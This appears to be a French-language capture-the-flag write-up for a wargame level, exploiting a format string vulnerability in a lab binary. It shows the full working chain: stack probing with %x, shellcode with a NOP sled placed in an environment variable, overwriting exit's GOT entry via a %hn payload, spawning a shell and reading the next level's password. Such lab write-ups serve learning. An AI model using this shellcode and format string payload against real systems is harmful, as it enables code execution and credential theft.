
## LEVEL 05

Au lancement du programme celui-ci attend une entrée, puis la print dans le terminal.

On peut essayer une format string attack.
```
 $ python -c "print 'aaaa ' + '%x ' * 15" > /tmp/payload
 $ cat /tmp/payload | ./level05
 aaaa 64 f7fcfac0 f7ec3af9 ffffd4ef ffffd4ee 0 ffffffff ffffd574 f7fdb000 61616161 20782520 25207825 78252078 20782520 252078
```
Printf stock alors notre string à la 10ème adresse.

On créé alors notre payload avec notre shellcode dans une variable d'environnement.

 ```
 export PAYLOAD=$(python -c 'print 500*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"')
 ```
    
Grace à gdb on peut trouver l'adresse de cette variable d'environnement.
```
(gdb) b *main
(gdb) x/200s environ
...
0xffffdbb4:      "PAYLOAD=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
0xffffdc7c:      "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
...
```
Notre payload se trouve alors à l'adresse 0xffffdbb4. On va prendre une adresse du nopesled comme dans les exercices de rainfall : 0xffffdc7c.

On va maintenant chercher l'adresse de l'exit dans le GOT pour la rediriger vers notre variable d'environnement.

```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048370  exit
0x08048370  exit@plt

(gdb) x/2i 0x08048370
   0x8048370 <exit@plt>:        jmp    *0x80497e0
   0x8048376 <exit@plt+6>:      push   $0x18
```

Bien, nous avons maintenant l'adresse de l'exit 0x80497e0

On va alors mettre l'adresse de notre variable d'environnement dans l'adresse ci-dessus. Le problème est qu'il faut la mettre en décimal ce qui fait beaucoup de caractères. On va donc diviser notre adresse en deux 0xdc7c(56444) et 0xffff (65535) que l'on met respectivement dans 0x80497e0 et 0x80497e2.

On coupe en deux on à donc :
65535 - 56444 = 9091

On enlève les 8 octets des deux adresses.
56444 - 8 = 56436

```
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56436d"+"%10$hn"+"%9091d"+"%11$hn"';cat) | ./level05
```
```
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
